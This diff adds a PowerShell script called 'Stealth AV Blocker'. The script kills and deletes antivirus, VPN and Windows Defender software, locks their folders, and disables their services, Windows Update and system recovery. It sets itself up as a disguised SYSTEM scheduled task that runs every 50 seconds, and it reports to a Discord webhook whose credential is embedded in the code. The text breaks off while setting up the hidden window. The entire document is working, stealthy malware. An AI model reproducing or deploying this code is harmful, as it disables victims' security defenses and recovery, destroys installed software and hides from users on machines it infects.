@@ -1,0 +1,850 @@
+# =============================================================================
+#   STEALTH AV BLOCKER - AUTO-INSTALL & AUTO-RUN
+#   - Self-installs silently on execution
+#   - Masquerades as Windows system process
+#   - No user interaction required
+#   - Sends all debug to Discord
+# =============================================================================
+
+$DiscordWebhook = "https://discord.com/api/webhooks/1462588358990499871/Y8ysN5j6H-PY7_EoRRLZ5Y4y15iW2lKN5MEwxKFnT5BULU6mz8vlfECCdw_dKFMqs6d1"
+$LogPath = "C:\Windows\System32\Logs\av_blocker.log"
+$StatsPath = "C:\Windows\System32\Logs\av_blocker_stats.txt"
+$InstalledFlag = "C:\Windows\System32\av_blocker_installed.flag"
+$ScriptInstallPath = "C:\Windows\System32\svchost_update.exe"
+
+if (-not (Test-Path (Split-Path $LogPath))) {
+    mkdir (Split-Path $LogPath) -Force | Out-Null
+}
+
+function Send-Discord {
+    param([string]$Message, [string]$Color = "3447003")
+    
+    try {
+        $payload = @{
+            embeds = @(
+                @{
+                    title = "AV Blocker Debug"
+                    description = $Message
+                    color = $Color
+                    timestamp = (Get-Date -Format "o")
+                    footer = @{
+                        text = $env:COMPUTERNAME
+                    }
+                }
+            )
+        } | ConvertTo-Json -Depth 10
+        
+        Invoke-WebRequest -Uri $DiscordWebhook -Method POST -ContentType "application/json" -Body $payload -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
+    }
+    catch { }
+}
+
+function Write-Log {
+    param([string]$Message, [string]$Level = "INFO")
+    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss.fff"
+    $logMessage = "[$timestamp] [$Level] $Message"
+    Write-Host $logMessage -ForegroundColor $(
+        switch ($Level) {
+            "SUCCESS" { "Green" }
+            "WARNING" { "Yellow" }
+            "ERROR" { "Red" }
+            default { "White" }
+        }
+    ) -ErrorAction SilentlyContinue
+    Add-Content -Path $LogPath -Value $logMessage -Encoding UTF8 -ErrorAction SilentlyContinue
+}
+
+function Write-Stats {
+    param([string]$Message)
+    Add-Content -Path $StatsPath -Value $Message -Encoding UTF8 -ErrorAction SilentlyContinue
+}
+
+# ============================================================================
+# SMART DETECTION
+# ============================================================================
+
+function Is-Path-Already-Targeted {
+    param([string]$Path)
+    
+    if (-not (Test-Path $Path)) { return $false }
+    
+    try {
+        $files = Get-ChildItem -Path $Path -File -ErrorAction SilentlyContinue | Select-Object -First 5
+        
+        if ($files.Count -lt 1) { return $false }
+        
+        $lockedCount = 0
+        foreach ($file in $files) {
+            try {
+                $acl = Get-Acl -Path $file.FullName -ErrorAction SilentlyContinue
+                if ($acl.Access | Where-Object { $_.IdentityReference -match "Everyone" -and $_.AccessControlType -eq "Deny" }) {
+                    $lockedCount++
+                }
+            }
+            catch { }
+        }
+        
+        if ($lockedCount -ge [math]::Min(5, $files.Count)) {
+            Write-Log "    [SKIP] Already targeted: $Path" "WARNING"
+            return $true
+        }
+    }
+    catch { }
+    
+    return $false
+}
+
+# ============================================================================
+# FIND ALL AV PATHS
+# ============================================================================
+
+function Find-All-AV-Paths {
+    Write-Log "Scanning system for ALL antivirus installations..." "INFO"
+    Send-Discord "🔍 Starting AV scan on $env:COMPUTERNAME..."
+    
+    $paths = @()
+    $avKeywords = @(
+        "avast", "avg", "totalav", "norton", "symantec", "mcafee", "kaspersky",
+        "bitdefender", "eset", "trend", "malwarebytes", "avira", "crowdstrike",
+        "sentinel", "carbon", "fortinet", "panda", "sophos", "comodo", "g.?data",
+        "dr\.?web", "k7", "quick.?heal", "webroot", "emsisoft", "vipre", "ccleaner",
+        "glary", "wise", "iobits", "expressvpn", "nordvpn", "protonvpn", "cloudflare",
+        "zonealarm", "spybot", "avneed", "isafe"
+    )
+    
+    Get-ChildItem -Path "C:\Program Files" -Directory -ErrorAction SilentlyContinue | ForEach-Object {
+        $dirName = $_.Name.ToLower()
+        foreach ($keyword in $avKeywords) {
+            if ($dirName -match $keyword) {
+                $paths += $_.FullName
+                Write-Log "  Found: $($_.FullName)" "SUCCESS"
+                break
+            }
+        }
+    }
+    
+    Get-ChildItem -Path "C:\Program Files (x86)" -Directory -ErrorAction SilentlyContinue | ForEach-Object {
+        $dirName = $_.Name.ToLower()
+        foreach ($keyword in $avKeywords) {
+            if ($dirName -match $keyword) {
+                $paths += $_.FullName
+                Write-Log "  Found: $($_.FullName)" "SUCCESS"
+                break
+            }
+        }
+    }
+    
+    Get-ChildItem -Path "C:\ProgramData" -Directory -ErrorAction SilentlyContinue | ForEach-Object {
+        $dirName = $_.Name.ToLower()
+        foreach ($keyword in $avKeywords) {
+            if ($dirName -match $keyword) {
+                $paths += $_.FullName
+                Write-Log "  Found: $($_.FullName)" "SUCCESS"
+                break
+            }
+        }
+    }
+    
+    Write-Log "Total AV installations found: $($paths.Count)" "SUCCESS"
+    Write-Stats "AV_PATHS_FOUND: $($paths.Count)"
+    Send-Discord "✅ Found $($paths.Count) AV installations" "65280"
+    
+    return $paths
+}
+
+# ============================================================================
+# PHASE 1: KILL ALL PROCESSES
+# ============================================================================
+
+function Kill-All-AV-Processes {
+    Write-Log "=========================================" "INFO"
+    Write-Log "PHASE 1: KILL ALL PROCESSES" "WARNING"
+    Write-Log "=========================================" "INFO"
+    Send-Discord "⚔️ PHASE 1: Killing AV processes..."
+    
+    $keywords = @(
+        "avast", "asw", "afw", "ash", "avg", "totalav", "norton", "symantec", "mcafee", "kaspersky",
+        "bitdefender", "eset", "trend", "malware", "mbam", "avira", "crowdstrike",
+        "sentinel", "carbon", "fortinet", "panda", "sophos", "comodo", "g.?data",
+        "dr\.?web", "k7", "quick.?heal", "webroot", "emsisoft", "vipre", "ccleaner",
+        "glary", "wise", "expressvpn", "nordvpn", "protonvpn", "cloudflare", "zonealarm",
+        "avneed", "isafe", "avira", "iobits"
+    )
+    
+    $totalKilled = 0
+    
+    Get-Process -ErrorAction SilentlyContinue | ForEach-Object {
+        $procName = $_.Name
+        $procPath = ""
+        
+        try {
+            $procPath = $_.MainModule.FileName
+        }
+        catch { }
+        
+        $fullInfo = "$procName $procPath".ToLower()
+        
+        foreach ($keyword in $keywords) {
+            if ($fullInfo -match $keyword -and $procName -notmatch "^svchost$|^services$|^lsass$|^csrss$|^system$|^idle$|^winlogon$|^explorer$|^dwm$") {
+                try {
+                    Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
+                    taskkill /PID $_.Id /F 2>&1 | Out-Null
+                    Write-Log "  ✓ Killed: $procName" "SUCCESS"
+                    $totalKilled++
+                }
+                catch { }
+                break
+            }
+        }
+    }
+    
+    Write-Log "Total killed: $totalKilled" "SUCCESS"
+    Write-Stats "PHASE1_KILLED: $totalKilled"
+    Send-Discord "✅ Killed $totalKilled processes" "65280"
+    return $totalKilled
+}
+
+# ============================================================================
+# PHASE 2: DELETE ALL FILES
+# ============================================================================
+
+function Delete-All-AV-Files {
+    param([string[]]$Paths)
+    
+    Write-Log "=========================================" "INFO"
+    Write-Log "PHASE 2: DELETE ALL FILES" "WARNING"
+    Write-Log "=========================================" "INFO"
+    Send-Discord "🗑️ PHASE 2: Deleting AV files..."
+    
+    $totalDeleted = 0
+    
+    foreach ($path in $Paths) {
+        if (Is-Path-Already-Targeted -Path $path) { continue }
+        
+        if (Test-Path $path) {
+            Write-Log "  Deleting: $path" "WARNING"
+            
+            try {
+                Get-ChildItem -Path $path -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
+                    try {
+                        if ($_.PSIsContainer) {
+                            Remove-Item -Path $_.FullName -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue
+                        } else {
+                            Remove-Item -Path $_.FullName -Force -Confirm:$false -ErrorAction SilentlyContinue
+                        }
+                        $totalDeleted++
+                    }
+                    catch { }
+                }
+            }
+            catch { }
+        }
+    }
+    
+    Write-Log "Total files deleted: $totalDeleted" "SUCCESS"
+    Write-Stats "PHASE2_DELETED: $totalDeleted"
+    Send-Discord "✅ Deleted $totalDeleted files" "65280"
+    return $totalDeleted
+}
+
+# ============================================================================
+# PHASE 3: CREATE DUMMY FILES
+# ============================================================================
+
+function Create-Dummy-Files {
+    param([string[]]$Paths)
+    
+    Write-Log "=========================================" "INFO"
+    Write-Log "PHASE 3: CREATE DUMMY BLOCKING FILES" "WARNING"
+    Write-Log "=========================================" "INFO"
+    Send-Discord "📄 PHASE 3: Creating dummy files..."
+    
+    $dummyFiles = @(
+        "AvastSvc.exe", "AvastUI.exe", "aswEngSrv.exe", "aswidsagent.exe", "aswToolsSvc.exe",
+        "afwServ.exe", "wsc_proxy.exe", "TuneupSvc.exe", "icarus.exe", "NortonCore.exe",
+        "ccSetMgr.exe", "mcsysmon.exe", "mfefire.exe", "avp.exe", "kavfstat.exe",
+        "bdagent.exe", "vsserv.exe", "ekrn.exe", "TmProxy.exe", "mbamservice.exe",
+        "avgnt.exe", "avguard.exe", "CSFalconService.exe", "SentinelAgent.exe", "FortiClient.exe",
+        "VipreService.exe", "PandaAV.exe", "SophosUI.exe", "cfp.exe", "G2Service.exe",
+        "drwebd.exe", "K7TSSecurityService.exe", "QuickHeal.exe", "WebrootSecureAnywhere.exe", "a2service.exe",
+        "Totalav.exe", "TotalavUI.exe", "Totalavupdate.exe"
+    )
+    
+    $totalCreated = 0
+    
+    foreach ($path in $Paths) {
+        if (Is-Path-Already-Targeted -Path $path) { continue }
+        
+        if (Test-Path $path) {
+            foreach ($dummyName in $dummyFiles) {
+                $dummyPath = "$path\$dummyName"
+                
+                try {
+                    if (Test-Path $dummyPath) {
+                        Remove-Item -Path $dummyPath -Force -Confirm:$false -ErrorAction SilentlyContinue
+                    }
+                    
+                    [System.IO.File]::WriteAllText($dummyPath, "BLOCKED_BY_AV_BLOCKER")
+                    Set-ItemProperty -Path $dummyPath -Name Attributes -Value ReadOnly -Force -ErrorAction SilentlyContinue
+                    $totalCreated++
+                }
+                catch { }
+            }
+        }
+    }
+    
+    Write-Log "Total dummies created: $totalCreated" "SUCCESS"
+    Write-Stats "PHASE3_DUMMIES: $totalCreated"
+    Send-Discord "✅ Created $totalCreated dummy files" "65280"
+    return $totalCreated
+}
+
+# ============================================================================
+# PHASE 4: CREATE BLOCKER FOLDERS
+# ============================================================================
+
+function Create-Blocker-Folders {
+    param([string[]]$Paths)
+    
+    Write-Log "=========================================" "INFO"
+    Write-Log "PHASE 4: CREATE BLOCKER FOLDERS" "WARNING"
+    Write-Log "=========================================" "INFO"
+    Send-Discord "📁 PHASE 4: Creating blocker folders..."
+    
+    $blockerNames = @(
+        "AvastSvc.exe", "AvastUI.exe", "aswEngSrv.exe", "aswidsagent.exe", "aswToolsSvc.exe",
+        "afwServ.exe", "wsc_proxy.exe", "NortonCore.exe", "mcsysmon.exe", "mfefire.exe",
+        "avp.exe", "bdagent.exe", "ekrn.exe", "TmProxy.exe", "mbamservice.exe",
+        "CSFalconService.exe", "SentinelAgent.exe", "FortiClient.exe", "Totalav.exe", "TotalavUI.exe"
+    )
+    
+    $totalBlockers = 0
+    
+    foreach ($path in $Paths) {
+        if (Is-Path-Already-Targeted -Path $path) { continue }
+        
+        if (Test-Path $path) {
+            foreach ($blockerName in $blockerNames) {
+                $blockerPath = "$path\$blockerName"
+                
+                try {
+                    if (Test-Path $blockerPath -PathType Leaf) {
+                        Remove-Item -Path $blockerPath -Force -Confirm:$false -ErrorAction SilentlyContinue
+                    }
+                    
+                    if (-not (Test-Path $blockerPath)) {
+                        mkdir $blockerPath -Force -ErrorAction SilentlyContinue | Out-Null
+                        $totalBlockers++
+                    }
+                }
+                catch { }
+            }
+        }
+    }
+    
+    Write-Log "Total blocker folders created: $totalBlockers" "SUCCESS"
+    Write-Stats "PHASE4_BLOCKERS: $totalBlockers"
+    Send-Discord "✅ Created $totalBlockers blocker folders" "65280"
+    return $totalBlockers
+}
+
+# ============================================================================
+# PHASE 5: LOCK EVERYTHING
+# ============================================================================
+
+function Lock-Everything {
+    param([string[]]$Paths)
+    
+    Write-Log "=========================================" "INFO"
+    Write-Log "PHASE 5: LOCK EVERYTHING" "WARNING"
+    Write-Log "=========================================" "INFO"
+    Send-Discord "🔒 PHASE 5: Locking all files..."
+    
+    $totalLocked = 0
+    
+    foreach ($path in $Paths) {
+        if (Is-Path-Already-Targeted -Path $path) { continue }
+        
+        if (Test-Path $path) {
+            try {
+                Get-ChildItem -Path $path -File -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
+                    try {
+                        cmd /c "icacls `"$($_.FullName)`" /deny Everyone:(F) /C /Q" 2>&1 | Out-Null
+                        $totalLocked++
+                    }
+                    catch { }
+                }
+                
+                Get-ChildItem -Path $path -Directory -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
+                    try {
+                        cmd /c "icacls `"$($_.FullName)`" /deny Everyone:(F) /C /Q" 2>&1 | Out-Null
+                        $totalLocked++
+                    }
+                    catch { }
+                }
+                
+                cmd /c "icacls `"$path`" /deny Everyone:(F) /T /C /Q" 2>&1 | Out-Null
+                $totalLocked++
+            }
+            catch { }
+        }
+    }
+    
+    Write-Log "Total items locked: $totalLocked" "SUCCESS"
+    Write-Stats "PHASE5_LOCKED: $totalLocked"
+    Send-Discord "✅ Locked $totalLocked items" "65280"
+    return $totalLocked
+}
+
+# ============================================================================
+# PHASE 6: DISABLE SERVICES
+# ============================================================================
+
+function Disable-AV-Services {
+    Write-Log "=========================================" "INFO"
+    Write-Log "PHASE 6: DISABLE SERVICES" "WARNING"
+    Write-Log "=========================================" "INFO"
+    Send-Discord "🛑 PHASE 6: Disabling AV services..."
+    
+    $keywords = @(
+        "avast", "asw", "afw", "ash", "avg", "totalav", "norton", "symantec", "mcafee", "kaspersky",
+        "bitdefender", "eset", "trend", "mbam", "avira", "crowdstrike", "sentinel", "fortinet",
+        "panda", "sophos", "comodo", "g.?data", "drweb", "k7", "webroot", "emsisoft", "vipre"
+    )
+    
+    $totalDisabled = 0
+    
+    Get-Service -ErrorAction SilentlyContinue | ForEach-Object {
+        $svcName = $_.Name
+        $svcDisplay = $_.DisplayName
+        
+        foreach ($keyword in $keywords) {
+            if ($svcName -match $keyword -or $svcDisplay -match $keyword) {
+                try {
+                    Stop-Service -Name $svcName -Force -ErrorAction SilentlyContinue
+                    
+                    $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$svcName"
+                    if (Test-Path $regPath) {
+                        Set-ItemProperty -Path $regPath -Name "Start" -Value 4 -Force -ErrorAction SilentlyContinue
+                        Set-ItemProperty -Path $regPath -Name "ImagePath" -Value "C:\nonexistent.exe" -Force -ErrorAction SilentlyContinue
+                    }
+                    
+                    Write-Log "    ✓ Disabled: $svcName" "SUCCESS"
+                    $totalDisabled++
+                }
+                catch { }
+                
+                break
+            }
+        }
+    }
+    
+    Write-Log "Total services disabled: $totalDisabled" "SUCCESS"
+    Write-Stats "PHASE6_DISABLED: $totalDisabled"
+    Send-Discord "✅ Disabled $totalDisabled services" "65280"
+    return $totalDisabled
+}
+
+# ============================================================================
+# PHASE 7: BLOCK WINDOWS UPDATES
+# ============================================================================
+
+function Block-Windows-Updates {
+    Write-Log "=========================================" "INFO"
+    Write-Log "PHASE 7: BLOCK WINDOWS UPDATES" "WARNING"
+    Write-Log "=========================================" "INFO"
+    Send-Discord "🚫 PHASE 7: Blocking Windows Updates..."
+    
+    $totalBlocked = 0
+    
+    try {
+        Stop-Service -Name wuauserv -Force -ErrorAction SilentlyContinue
+        Set-Service -Name wuauserv -StartupType Disabled -ErrorAction SilentlyContinue
+        $totalBlocked++
+        
+        $wuReg = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate"
+        if (-not (Test-Path $wuReg)) { mkdir $wuReg -Force -ErrorAction SilentlyContinue | Out-Null }
+        
+        Set-ItemProperty -Path $wuReg -Name "DoNotConnect" -Value 1 -Force -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path $wuReg -Name "DisableWindowsUpdateAccess" -Value 1 -Force -ErrorAction SilentlyContinue
+        $totalBlocked++
+        
+        $auReg = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\AU"
+        if (-not (Test-Path $auReg)) { mkdir $auReg -Force -ErrorAction SilentlyContinue | Out-Null }
+        
+        Set-ItemProperty -Path $auReg -Name "NoAutoUpdate" -Value 1 -Force -ErrorAction SilentlyContinue
+        $totalBlocked++
+        
+        Stop-Service -Name UsoSvc -Force -ErrorAction SilentlyContinue
+        Set-Service -Name UsoSvc -StartupType Disabled -ErrorAction SilentlyContinue
+        $totalBlocked++
+    }
+    catch { }
+    
+    Write-Log "Total update blocks: $totalBlocked" "SUCCESS"
+    Write-Stats "PHASE7_BLOCKED_UPDATES: $totalBlocked"
+    Send-Discord "✅ Blocked Windows Updates" "65280"
+    return $totalBlocked
+}
+
+# ============================================================================
+# PHASE 8: DISABLE RECOVERY
+# ============================================================================
+
+function Disable-Recovery {
+    Write-Log "=========================================" "INFO"
+    Write-Log "PHASE 8: DISABLE RECOVERY" "WARNING"
+    Write-Log "=========================================" "INFO"
+    Send-Discord "🔐 PHASE 8: Disabling recovery..."
+    
+    $totalDisabled = 0
+    
+    try {
+        $sysRestorePath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore"
+        if (-not (Test-Path $sysRestorePath)) { mkdir $sysRestorePath -Force -ErrorAction SilentlyContinue | Out-Null }
+        
+        Set-ItemProperty -Path $sysRestorePath -Name "DisableSR" -Value 1 -Force -ErrorAction SilentlyContinue
+        $totalDisabled++
+        
+        Stop-Service -Name VSS -Force -ErrorAction SilentlyContinue
+        Set-Service -Name VSS -StartupType Disabled -ErrorAction SilentlyContinue
+        $totalDisabled++
+    }
+    catch { }
+    
+    Write-Log "Total recovery disables: $totalDisabled" "SUCCESS"
+    Write-Stats "PHASE8_DISABLED_RECOVERY: $totalDisabled"
+    Send-Discord "✅ Disabled recovery systems" "65280"
+    return $totalDisabled
+}
+
+# ============================================================================
+# PHASE 9: CLEAR DESKTOP SHORTCUTS
+# ============================================================================
+
+function Clear-Desktop-Shortcuts {
+    Write-Log "=========================================" "INFO"
+    Write-Log "PHASE 9: CLEAR DESKTOP SHORTCUTS" "WARNING"
+    Write-Log "=========================================" "INFO"
+    Send-Discord "🧹 PHASE 9: Clearing desktop shortcuts..."
+    
+    $totalRemoved = 0
+    
+    $desktopPaths = @(
+        "$env:USERPROFILE\Desktop",
+        "$env:PUBLIC\Desktop"
+    )
+    
+    $avKeywords = @(
+        "avast", "avg", "totalav", "norton", "mcafee", "kaspersky", "bitdefender", "eset",
+        "trend", "malwarebytes", "avira", "crowdstrike", "sentinel", "fortinet", "panda",
+        "sophos", "comodo", "g.?data", "dr.?web", "webroot", "emsisoft", "vipre"
+    )
+    
+    foreach ($deskPath in $desktopPaths) {
+        if (Test-Path $deskPath) {
+            Get-ChildItem -Path $deskPath -ErrorAction SilentlyContinue | ForEach-Object {
+                $itemName = $_.Name.ToLower()
+                
+                foreach ($keyword in $avKeywords) {
+                    if ($itemName -match $keyword) {
+                        try {
+                            Remove-Item -Path $_.FullName -Force -Confirm:$false -ErrorAction SilentlyContinue
+                            Write-Log "    ✓ Removed: $($_.Name)" "SUCCESS"
+                            $totalRemoved++
+                        }
+                        catch { }
+                        break
+                    }
+                }
+            }
+        }
+    }
+    
+    Write-Log "Total shortcuts removed: $totalRemoved" "SUCCESS"
+    Write-Stats "PHASE9_SHORTCUTS_REMOVED: $totalRemoved"
+    Send-Discord "✅ Removed $totalRemoved shortcuts" "65280"
+    return $totalRemoved
+}
+
+# ============================================================================
+# PHASE 10: REMOVE WINDOWS DEFENDER
+# ============================================================================
+
+function Remove-Windows-Defender {
+    Write-Log "=========================================" "INFO"
+    Write-Log "PHASE 10: REMOVE WINDOWS DEFENDER (ONE-TIME)" "WARNING"
+    Write-Log "=========================================" "INFO"
+    Send-Discord "🛡️ PHASE 10: Removing Windows Defender..."
+    
+    $totalRemoved = 0
+    
+    try {
+        Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
+        Stop-Service -Name SecurityHealthService -Force -ErrorAction SilentlyContinue
+        Stop-Service -Name wscsvc -Force -ErrorAction SilentlyContinue
+        Stop-Service -Name WdNisSvc -Force -ErrorAction SilentlyContinue
+        Stop-Service -Name MpsSvc -Force -ErrorAction SilentlyContinue
+        
+        Set-Service -Name WinDefend -StartupType Disabled -ErrorAction SilentlyContinue -Force
+        Set-Service -Name SecurityHealthService -StartupType Disabled -ErrorAction SilentlyContinue -Force
+        Set-Service -Name wscsvc -StartupType Disabled -ErrorAction SilentlyContinue -Force
+        Set-Service -Name WdNisSvc -StartupType Disabled -ErrorAction SilentlyContinue -Force
+        Set-Service -Name MpsSvc -StartupType Disabled -ErrorAction SilentlyContinue -Force
+        
+        $totalRemoved += 2
+        
+        $defenderReg = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
+        if (-not (Test-Path $defenderReg)) { mkdir $defenderReg -Force -ErrorAction SilentlyContinue | Out-Null }
+        
+        Set-ItemProperty -Path $defenderReg -Name "DisableAntiSpyware" -Value 1 -Force -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path $defenderReg -Name "DisableAntiVirus" -Value 1 -Force -ErrorAction SilentlyContinue
+        
+        $rtpReg = "$defenderReg\Real-Time Protection"
+        if (-not (Test-Path $rtpReg)) { mkdir $rtpReg -Force -ErrorAction SilentlyContinue | Out-Null }
+        
+        Set-ItemProperty -Path $rtpReg -Name "DisableBehaviorMonitoring" -Value 1 -Force -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path $rtpReg -Name "DisableOnAccessProtection" -Value 1 -Force -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path $rtpReg -Name "DisableRealtimeMonitoring" -Value 1 -Force -ErrorAction SilentlyContinue
+        
+        $totalRemoved++
+        
+        $defenderPath = "C:\Program Files\Windows Defender"
+        if (Test-Path $defenderPath) {
+            Get-ChildItem -Path $defenderPath -Recurse -Force -ErrorAction SilentlyContinue | Where-Object {
+                $_.Name -notmatch "\.sys$"
+            } | ForEach-Object {
+                try {
+                    Remove-Item -Path $_.FullName -Force -Confirm:$false -ErrorAction SilentlyContinue
+                }
+                catch { }
+            }
+            $totalRemoved++
+        }
+        
+        $defenderData = "C:\ProgramData\Microsoft\Windows Defender"
+        if (Test-Path $defenderData) {
+            Get-ChildItem -Path $defenderData -Recurse -Force -ErrorAction SilentlyContinue | Where-Object {
+                $_.Name -notmatch "\.sys$"
+            } | ForEach-Object {
+                try {
+                    Remove-Item -Path $_.FullName -Force -Confirm:$false -ErrorAction SilentlyContinue
+                }
+                catch { }
+            }
+            $totalRemoved++
+        }
+        
+        try {
+            Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Windows Defender" -Force -Confirm:$false -Recurse -ErrorAction SilentlyContinue
+        }
+        catch { }
+        
+        $totalRemoved++
+    }
+    catch { }
+    
+    Write-Log "Total Defender removals: $totalRemoved" "SUCCESS"
+    Write-Stats "PHASE10_DEFENDER_REMOVED: $totalRemoved"
+    Send-Discord "✅ Removed Windows Defender ($totalRemoved operations)" "65280"
+    return $totalRemoved
+}
+
+# ============================================================================
+# MAIN EXECUTION
+# ============================================================================
+
+function Execute-Complete-Eradication {
+    Write-Log "=========================================" "INFO"
+    Write-Log "UNIVERSAL AV BLOCKER - FULL EXECUTION" "INFO"
+    Write-Log "=========================================" "INFO"
+    Send-Discord "🚀 **AV BLOCKER STARTING ON $env:COMPUTERNAME**" "16711680"
+    
+    Write-Log "" "INFO"
+    Write-Log "=========================================" "INFO"
+    Write-Log "SCANNING FOR ALL ANTIVIRUSES" "WARNING"
+    Write-Log "=========================================" "INFO"
+    $avPaths = Find-All-AV-Paths
+    
+    $killed = Kill-All-AV-Processes
+    $deleted = Delete-All-AV-Files -Paths $avPaths
+    $dummies = Create-Dummy-Files -Paths $avPaths
+    $blockers = Create-Blocker-Folders -Paths $avPaths
+    $locked = Lock-Everything -Paths $avPaths
+    $disabled = Disable-AV-Services
+    $blockedUpdates = Block-Windows-Updates
+    $disabledRecovery = Disable-Recovery
+    $shortcutsRemoved = Clear-Desktop-Shortcuts
+    $defenderRemoved = Remove-Windows-Defender
+    
+    Write-Log "" "INFO"
+    Write-Log "=========================================" "INFO"
+    Write-Log "COMPLETE ERADICATION SUMMARY" "INFO"
+    Write-Log "=========================================" "INFO"
+    Write-Log "Processes killed: $killed" "SUCCESS"
+    Write-Log "Files deleted: $deleted" "SUCCESS"
+    Write-Log "Dummy files created: $dummies" "SUCCESS"
+    Write-Log "Blocker folders created: $blockers" "SUCCESS"
+    Write-Log "Items locked: $locked" "SUCCESS"
+    Write-Log "Services disabled: $disabled" "SUCCESS"
+    Write-Log "Windows Update blocks: $blockedUpdates" "SUCCESS"
+    Write-Log "Recovery disables: $disabledRecovery" "SUCCESS"
+    Write-Log "Desktop shortcuts removed: $shortcutsRemoved" "SUCCESS"
+    Write-Log "Defender removals: $defenderRemoved" "SUCCESS"
+    Write-Log "=========================================" "INFO"
+    
+    Write-Stats "FINAL_KILLED: $killed"
+    Write-Stats "FINAL_DELETED: $deleted"
+    Write-Stats "FINAL_DUMMIES: $dummies"
+    Write-Stats "FINAL_BLOCKERS: $blockers"
+    Write-Stats "FINAL_LOCKED: $locked"
+    Write-Stats "FINAL_DISABLED: $disabled"
+    Write-Stats "FINAL_UPDATES_BLOCKED: $blockedUpdates"
+    Write-Stats "FINAL_RECOVERY_DISABLED: $disabledRecovery"
+    Write-Stats "FINAL_SHORTCUTS_REMOVED: $shortcutsRemoved"
+    Write-Stats "FINAL_DEFENDER_REMOVED: $defenderRemoved"
+    
+    $summary = @"
+**✅ ERADICATION COMPLETE**
+Processes: $killed
+Files: $deleted
+Dummies: $dummies
+Blockers: $blockers
+Locked: $locked
+Services: $disabled
+Updates: $blockedUpdates
+Recovery: $disabledRecovery
+Shortcuts: $shortcutsRemoved
+Defender: $defenderRemoved
+"@
+    Send-Discord $summary "65280"
+}
+
+# ============================================================================
+# AUTO-INSTALL & STEALTH SETUP
+# ============================================================================
+
+function Setup-Stealth-Install {
+    # Check if already installed
+    if (Test-Path $InstalledFlag) {
+        Send-Discord "⏰ Maintenance cycle running on $env:COMPUTERNAME" "3447003"
+        return
+    }
+    
+    try {
+        # Create flag FIRST so we know we're installing
+        "Installed_" | Out-File -FilePath $InstalledFlag -Encoding UTF8 -Force -ErrorAction SilentlyContinue
+        
+        # Copy script to System32 with system-looking name
+        Copy-Item -Path $PSCommandPath -Destination $ScriptInstallPath -Force -ErrorAction SilentlyContinue
+        
+        Send-Discord "📦 Installing stealth service on $env:COMPUTERNAME..." "16776960"
+        
+        # Remove old task if exists
+        try {
+            Unregister-ScheduledTask -TaskName "Windows Service Host Update" -Confirm:$false -ErrorAction SilentlyContinue -Force
+            Start-Sleep -Milliseconds 1000
+        }
+        catch { }
+        
+        try {
+            # Create principal with SYSTEM rights
+            $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest -ErrorAction SilentlyContinue
+            
+            # Create action
+            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$ScriptInstallPath`"" -ErrorAction SilentlyContinue
+            
+            # Create startup trigger
+            $triggerAtBoot = New-ScheduledTaskTrigger -AtStartup -ErrorAction SilentlyContinue
+            
+            # Create repeating trigger (every 50 seconds)
+            $triggerRepeat = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Seconds 50) -RepetitionDuration (New-TimeSpan -Days 36500) -ErrorAction SilentlyContinue
+            
+            # Settings
+            $settings = New-ScheduledTaskSettingsSet `
+                -AllowStartIfOnBatteries `
+                -DontStopIfGoingOnBatteries `
+                -StartWhenAvailable `
+                -RunOnlyIfNetworkAvailable:$false `
+                -MultipleInstances IgnoreNew `
+                -ErrorAction SilentlyContinue
+            
+            # Register the task
+            Register-ScheduledTask `
+                -TaskName "Windows Service Host Update" `
+                -Principal $principal `
+                -Action $action `
+                -Trigger @($triggerAtBoot, $triggerRepeat) `
+                -Settings $settings `
+                -Force `
+                -ErrorAction Stop | Out-Null
+            
+            Start-Sleep -Milliseconds 500
+            
+            # Verify it was created
+            $task = Get-ScheduledTask -TaskName "Windows Service Host Update" -ErrorAction SilentlyContinue
+            if ($task) {
+                Write-Log "✓ Task created successfully" "SUCCESS"
+                Send-Discord "✅ Stealth service installed! Running at boot + every 50 seconds" "65280"
+            } else {
+                Write-Log "! Task verification failed, using CMD fallback" "WARNING"
+                # Fallback: use schtasks command
+                cmd /c "schtasks /create /tn `"Windows Service Host Update`" /tr `"powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File $ScriptInstallPath`" /sc minute /mo 1 /ru SYSTEM /rl HIGHEST /f /ito" 2>&1 | Out-Null
+                Send-Discord "✅ Stealth service installed (fallback method)! Running every minute" "65280"
+            }
+        }
+        catch {
+            Write-Log "! Task registration failed: $_, trying fallback" "ERROR"
+            # Fallback using schtasks
+            try {
+                cmd /c "schtasks /create /tn `"Windows Service Host Update`" /tr `"powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File $ScriptInstallPath`" /sc minute /mo 1 /ru SYSTEM /rl HIGHEST /f /ito" 2>&1 | Out-Null
+                Send-Discord "✅ Stealth service installed (CMD fallback)! Running every minute" "65280"
+            }
+            catch {
+                Send-Discord "❌ All installation methods failed: $_" "16711680"
+            }
+        }
+    }
+    catch {
+        Write-Log "! Setup error: $_" "ERROR"
+        Send-Discord "⚠️ Installation error: $_" "16776960"
+    }
+}
+
+# ============================================================================
+# STEALTH EXECUTION
+# ============================================================================
+
+# Hide window
+Add-Type -Name Window -Namespace Console -MemberDefinition '
+[DllImport("Kernel32.dll")]
